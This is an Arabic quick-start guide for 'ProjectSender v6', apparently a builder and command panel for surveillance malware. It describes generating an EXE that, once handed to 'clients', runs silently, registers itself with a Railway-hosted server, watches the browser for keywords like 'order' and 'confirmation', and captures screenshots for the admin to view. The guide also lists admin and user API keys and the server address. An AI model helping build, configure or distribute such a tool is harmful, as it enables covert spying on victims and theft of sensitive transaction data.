# ProjectSender v6 - Quick Start Guide

## 🚀 البدء السريع

### الملفات الأساسية فقط:

```
ProjectSender_v6_Production/
├── panel_v6_railway.py              # لوحة التحكم
├── main_backend_v4.py               # الخادم (Railway)
├── build_exe_from_config_v4.py      # بناء EXE
├── build_exe_from_config_v3.py      # احتياطي
├── requirements.txt                 # المكتبات
├── INTEGRATION_GUIDE.md             # دليل كامل
├── CHANGES_v6.md                    # التغييرات
└── QUICK_START.md                   # هذا الملف
```

---

## ⚡ البدء في 3 خطوات

### 1️⃣ تشغيل لوحة التحكم

```bash
# تثبيت المكتبات
pip install -r requirements.txt

# تشغيل لوحة التحكم
python panel_v6_railway.py
```

### 2️⃣ إنشاء EXE

في لوحة التحكم:
- اذهب إلى تبويب "Generate EXE"
- أكتب الكلمات المفتاحية: `order,confirmation,scure`
- اختر عدد الصور: `50`
- اضغط "Generate & Save EXE Auto"
- اختر مكان الحفظ

### 3️⃣ توزيع على العملاء

- أعطِ الملف `.exe` للعميل
- يشتغل بلاش ويسجل نفسو
- شوف النتائج في لوحة التحكم

---

## 🔧 المفاتيح (API Keys)

```
Admin Key:  skpro_admin_xK9mP3qR7vN2bL8wY5jH4dF6gT1cZeR
User Key:   skpro_user_aB7cD2eF5gH8iJ3kL6mN9oP4qR1sT5uV
Server:     https://sender-production-7ee8.up.railway.app
```

---

## 📊 الميزات

✅ جدول احترافي للعملاء (10 أعمدة)
✅ عرض الصور بضغطة مزدوجة
✅ إرسال كلمات مفتاحية
✅ حذف الصور
✅ بناء EXE مخصص
✅ مراقبة المتصفح تلقائياً

---

## 🐛 حل المشاكل

### المشكلة: Build failed

**الحل:**
```bash
pip install pyinstaller pillow requests
```

### المشكلة: Client not appearing

**الحل:**
1. تأكد من اتصال الإنترنت
2. تأكد من تشغيل الخادم
3. شغل EXE مرة أخرى

---

## 📁 ملفات مهمة

| الملف | الوصف |
|------|--------|
| `panel_v6_railway.py` | لوحة التحكم الرئيسية |
| `main_backend_v4.py` | الخادم (يعمل على Railway) |
| `build_exe_from_config_v4.py` | بناء EXE |
| `INTEGRATION_GUIDE.md` | دليل كامل مفصل |

---

## 🎯 سير العمل

```
1. Admin Panel
   ↓
2. Generate EXE (keywords: order, confirmation, scure)
   ↓
3. Build Script (create client with keywords)
   ↓
4. Distribute EXE to clients
   ↓
5. Client runs EXE
   ↓
6. Client monitors browser
   ↓
7. Client captures screenshots
   ↓
8. Admin views results
```

---

## 📞 الدعم

للمزيد من المعلومات، اقرأ:
- `INTEGRATION_GUIDE.md` - دليل شامل
- `CHANGES_v6.md` - ملخص التغييرات
- `README.md` - التوثيق الكامل

---

**Ready to go! 🚀**
